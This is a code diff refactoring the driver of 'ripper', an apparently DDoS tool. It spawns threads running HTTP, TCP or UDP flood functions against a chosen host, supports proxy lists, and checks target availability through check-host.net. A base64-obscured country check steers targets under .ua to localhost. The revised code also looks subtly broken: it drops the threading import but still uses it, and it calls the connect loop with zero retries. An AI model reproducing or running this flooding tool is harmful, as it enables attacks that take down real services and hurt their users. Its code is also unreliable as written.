@@ -1,38 +1,30 @@
-import os
-import threading
-import socket
+import datetime
 import time
 import sys
 from optparse import OptionParser
 from base64 import b64decode
-from typing import List
-from datetime import datetime
-from colorama import Fore
-from ripper.context import Context
-from ripper.attacks import down_it_http, down_it_tcp, down_it_udp
-from ripper.common import (readfile, get_current_ip, get_no_successful_connection_error_msg, get_host_country,
-                           __isCloudFlareProtected, print_usage, parse_args)
-from ripper.constants import (SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC, USAGE, EPILOG,
-                              NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC)
-from ripper.statistics import show_info
-from ripper.health_check import fetch_host_statuses, get_health_check_method
-from ripper.proxy import Sock5Proxy, read_proxy_list
+
+from ripper import context, common
+from ripper.attacks import *
+from ripper.common import (get_current_ip, print_usage, parse_args, format_dt)
+from ripper.constants import *
+from ripper.context import Errors, ErrorCodes
+from ripper.statistic import render
+from ripper.health_check import fetch_host_statuses
 
 _ctx = Context()
 
 
-def create_thread_pool(_ctx: Context) -> list:
+def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
+    """Create Thread pool for selected attack method."""
     thread_pool = []
     for i in range(int(_ctx.threads)):
         if _ctx.attack_method == 'http':
-            thread_pool.append(threading.Thread(
-                target=down_it_http, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
         elif _ctx.attack_method == 'tcp':
-            thread_pool.append(threading.Thread(
-                target=down_it_tcp, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
         else:  # _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(
-                target=down_it_udp, args=[_ctx]))
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
 
         thread_pool[i].daemon = True  # if thread is exist, it dies
         thread_pool[i].start()
@@ -40,66 +32,20 @@ def create_thread_pool(_ctx: Context) -> list:
     return thread_pool
 
 
-def update_url(_ctx: Context):
-    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}{_ctx.http_path}"
-
-
-def init_context(_ctx: Context, args):
-    """Initialize Context from Input args."""
-    _ctx.host = args[0].host
-    _ctx.host_ip = ''
-    _ctx.original_host = args[0].host
-    _ctx.port = args[0].port
-    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
-    if args[0].http_method:
-        _ctx.http_method = args[0].http_method.upper()
-    if args[0].http_path:
-        _ctx.http_path = args[0].http_path.lower()
-    update_url(_ctx)
-
-    _ctx.threads = args[0].threads
-
-    _ctx.attack_method = str(args[0].attack_method).lower()
-    _ctx.random_packet_len = bool(args[0].random_packet_len)
-    _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
-
-    _ctx.isCloudflareProtected = __isCloudFlareProtected(
-        _ctx.host, _ctx.user_agents)
-
-    _ctx.health_check_method = get_health_check_method(_ctx.attack_method)
-    _ctx.is_health_check = False if args[0].health_check == '0' else True
-
-    _ctx.proxy_list = read_proxy_list(
-        args[0].proxy_list) if args[0].proxy_list else None
-    _ctx.proxy_list_initial_len = len(
-        _ctx.proxy_list) if _ctx.proxy_list is not None else 0
-
-
-def update_host_ip(_ctx: Context):
-    """Gets target's IP by host"""
-    try:
-        _ctx.host_ip = socket.gethostbyname(_ctx.host)
-        _ctx.target_country = get_host_country(_ctx.host_ip)
-    except:
-        pass
-
-
-def update_current_ip(_ctx: Context):
-    """Updates current ip"""
-    _ctx.getting_ip_in_progress = True
-    _ctx.current_ip = get_current_ip()
-    _ctx.getting_ip_in_progress = False
-    if _ctx.start_ip == '':
-        _ctx.start_ip = _ctx.current_ip
+def update_current_ip(_ctx: Context) -> None:
+    """Updates current IPv4 address."""
+    _ctx.Statistic.connect.set_state_in_progress()
+    _ctx.IpInfo.my_current_ip = get_current_ip()
+    _ctx.Statistic.connect.set_state_is_connected()
+    if _ctx.IpInfo.my_start_ip is None:
+        _ctx.IpInfo.my_start_ip = _ctx.IpInfo.my_current_ip
 
 
 def update_host_statuses(_ctx: Context):
     """Updates host statuses based on check-host.net nodes"""
-    MIN_UPDATE_HOST_STATUSES_TIMEOUT = 120
-
     diff = float('inf')
     if _ctx.last_host_statuses_update is not None:
-        diff = time.time() - datetime.timestamp(_ctx.last_host_statuses_update)
+        diff = time.time() - datetime.datetime.timestamp(_ctx.last_host_statuses_update)
 
     if _ctx.fetching_host_statuses_in_progress or diff < MIN_UPDATE_HOST_STATUSES_TIMEOUT:
         return
@@ -110,116 +56,113 @@ def update_host_statuses(_ctx: Context):
             # API in some cases returns 403, so we can't update statuses
             if len(host_statuses.values()):
                 _ctx.host_statuses = host_statuses
-                _ctx.last_host_statuses_update = datetime.now()
+                _ctx.last_host_statuses_update = datetime.datetime.now()
     except:
         pass
     finally:
         _ctx.fetching_host_statuses_in_progress = False
 
 
-def connect_host(_ctx: Context):
-    _ctx.connecting_host = True
+def connect_host(_ctx: Context) -> bool:
+    _ctx.Statistic.connect.set_state_in_progress()
     try:
         sock = _ctx.sock_manager.create_tcp_socket()
         sock.connect((_ctx.host, _ctx.port))
     except:
-        _ctx.connections_failed += 1
+        res = False
+        _ctx.Statistic.connect.failed += 1
     else:
-        _ctx.connections_success += 1
+        res = True
+        _ctx.Statistic.connect.success += 1
         sock.close()
-    _ctx.connecting_host = False
-
+    _ctx.Statistic.connect.set_state_is_connected()
+    return res
 
 def check_successful_connections(_ctx: Context) -> bool:
     """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec.
-    Returns True if there was successfull connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
+    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec.
+    :parameter _ctx: Context
+    """
     curr_ms = time.time_ns()
-    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
-    error_msg = get_no_successful_connection_error_msg()
-    if _ctx.connections_success == _ctx.connections_success_prev:
+    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000
+
+    if _ctx.Statistic.connect.success == _ctx.Statistic.connect.success_prev:
         if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
-            if error_msg not in _ctx.errors:
-                _ctx.errors.append(error_msg)
+            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG))
             return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
     else:
-        _ctx.connections_check_time = curr_ms
-        _ctx.connections_success_prev = _ctx.connections_success
-        if error_msg in _ctx.errors:
-            _ctx.errors.remove(error_msg)
+        _ctx.Statistic.connect.last_check_time = curr_ms
+        _ctx.Statistic.connect.sync_success()
+        _ctx.remove_error(ErrorCodes.ConnectionError.value)
+
     return True
 
 
 def check_successful_tcp_attack(_ctx: Context) -> bool:
-    """Checks if there are changes in sended bytes count.
-    Returns True if there was successfull connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
+    """Checks if there are changes in sent bytes count.
+    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
     curr_ms = time.time_ns()
-    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
-    error_msg = get_no_successful_connection_error_msg()
-    if _ctx.packets_sent == _ctx.packets_sent_prev:
+    diff_sec = (curr_ms - _ctx.Statistic.packets.connections_check_time) / 1000000 / 1000
+
+    if _ctx.Statistic.packets.total_sent == _ctx.Statistic.packets.total_sent_prev:
         if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
-            if error_msg not in _ctx.errors:
-                _ctx.errors.append(error_msg)
+            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG))
+
             return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
     else:
-        _ctx.connections_check_time = curr_ms
-        _ctx.packets_sent_prev = _ctx.packets_sent
-        if error_msg in _ctx.errors:
-            _ctx.errors.remove(error_msg)
+        _ctx.Statistic.packets.connections_check_time = curr_ms
+        _ctx.Statistic.packets.sync_packets_sent()
+        _ctx.remove_error(ErrorCodes.ConnectionError.value)
+
     return True
 
 
-def go_home(_ctx: Context):
+def go_home(_ctx: Context) -> None:
     """Modifies host to match the rules"""
     home_code = b64decode('dWE=').decode('utf-8')
-    if _ctx.host.endswith('.' + home_code.lower()) or get_host_country(_ctx.host_ip) in home_code.upper():
+    if _ctx.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
         _ctx.host_ip = _ctx.host = 'localhost'
-        _ctx.original_host += '*'
-        update_url(_ctx)
+        _ctx.host += '*'
 
 
-def validate_input(args):
+def validate_input(args) -> bool:
     """Validates input params."""
     if int(args.port) < 0:
-        print(f'{Fore.RED}Wrong port number.{Fore.RESET}')
+        print(f'Wrong port number.')
         return False
 
     if int(args.threads) < 1:
-        print(f'{Fore.RED}Wrong threads number.{Fore.RESET}')
+        print(f'Wrong threads number.')
         return False
 
     if not args.host:
-        print(f'{Fore.RED}Host wasn\'t detected{Fore.RESET}')
+        print(f'Host wasn\'t detected')
         return False
 
     if args.attack_method.lower() not in ('udp', 'tcp', 'http'):
-        print(f'{Fore.RED}Wrong attack type. Possible options: udp, tcp, http.{Fore.RESET}')
+        print(f'Wrong attack type. Possible options: udp, tcp, http.')
         return False
 
-    if args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
-        print(f'{Fore.RED}Wrong http method type. Possible options: get, post, head, put, delete, trace, connect, options, patch.{Fore.RESET}')
+    if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
+        print(f'Wrong http method type. Possible options: get, post, head, put, delete, trace, connect, options, patch.')
         return False
 
-    if not args.http_path.startswith('/'):
-        print(f'{Fore.RED}Http path should start with /.{Fore.RESET}')
-        return False
-
-    return True
-
-
-def validate_context(_ctx: Context):
-    """Validates context"""
-    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
-        print(f'{Fore.RED}Could not connect to the host{Fore.RESET}')
+    if args.http_path and not args.http_path.startswith('/'):
+        print(f'Http path should start with /.')
         return False
 
     return True
 
 
-def connect_host_loop(_ctx: Context, timeout_secs: int = 3) -> None:
+def connect_host_loop(_ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY, timeout_secs: int = 3) -> None:
     """Tries to connect host in permanent loop."""
-    while True:
-        connect_host(_ctx)
+    i = 0
+    while i < retry_cnt:
+        print(f'{format_dt(datetime.datetime.now())} ({i+1}/{retry_cnt}) Trying connect to {_ctx.host}:{_ctx.port}...')
+        if connect_host(_ctx):
+            break
         time.sleep(timeout_secs)
+        i += 1
 
 
 def main():
@@ -230,28 +173,19 @@ def main():
     if len(sys.argv) < 2 or not validate_input(args[0]):
         print_usage(parser)
 
-    init_context(_ctx, args)
-    update_host_ip(_ctx)
+    # Init context
+    context.init_context(_ctx, args)
     update_current_ip(_ctx)
-    _ctx.my_country = get_host_country(_ctx.current_ip)
     go_home(_ctx)
+    if _ctx.proxy_list_initial_len > 0:
+        connect_host_loop(_ctx, retry_cnt=0)
 
-    if not validate_context(_ctx):
-        sys.exit()
+    _ctx.validate()
 
-    connect_host(_ctx)
-
-    time.sleep(1)
-    show_info(_ctx)
-
-    _ctx.connections_check_time = time.time_ns()
+    if _ctx.is_health_check:
+        update_host_statuses(_ctx)
+        time.sleep(.5)
 
     create_thread_pool(_ctx)
 
-    if _ctx.attack_method == 'udp' and _ctx.port:
-        thread = threading.Thread(target=connect_host_loop, args=[_ctx])
-        thread.daemon = True
-        thread.start()
-
-    while True:
-        time.sleep(1)
+    render(_ctx)
